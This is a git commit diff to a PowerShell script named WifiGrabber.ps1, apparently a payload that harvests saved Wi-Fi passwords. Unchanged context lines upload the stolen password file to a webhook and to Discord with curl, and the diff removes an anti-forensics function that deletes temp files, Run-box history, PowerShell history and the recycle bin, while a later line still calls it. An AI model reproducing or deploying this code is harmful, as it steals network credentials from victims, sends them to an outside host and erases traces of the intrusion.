bcd2d14100994b933535bf617658e77730ea7e62
Cronix <98478052+Cronix2@users.noreply.github.com>
2024-02-22 17:04:14 +0100

    Update WifiGrabber.ps1

--- WifiGrabber.ps1
+++ WifiGrabber.ps1
@@ -58,26 +58,6 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
 
- 
-
-############################################################################################################################################################
-
-function Clean-Exfil { 
-
-# empty temp folder
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
-
-# Delete powershell history
-Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-
-# Empty recycle bin
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
-}
-
 ############################################################################################################################################################
 
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
